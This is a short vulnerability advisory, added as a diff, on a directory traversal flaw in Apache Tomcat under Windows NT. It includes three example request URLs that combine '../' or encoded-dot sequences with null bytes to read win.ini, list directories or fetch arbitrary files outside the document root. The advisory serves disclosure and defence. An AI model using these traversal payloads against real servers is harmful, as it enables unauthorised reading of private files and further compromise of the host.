@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/2518/info
+
+Apache Tomcat in a Windows NT environment could be led to traverse the normal directory structure and return requested files from outside of the document root.
+
+By including '/../' sequences along with specially chosen characters in requested URLs, a remote user can obtain read access to directories and files outside of the document root, potentially compromising the privacy of user data and/or obtaining information which could be used to further compromise the host. 
+
+The following examples have been provided by lovehacker <lovehacker@263.net>:
+
+http://www.example.com/../../winnt/win.ini%00examples/jsp/hello.jsp
+
+Will cause the Tomcat server to send back the content of win.ini.
+
+http://www.example.com/%2e%2e/%2e%2e/%00.jsp
+
+will disclose a directory listing from outside Tomcat's normal directory tree.
+
+http://www.example.com/%2e%2e/%2e%2e%5cfilename%00.jsp
+
+will reveal the requested file [filename]. 
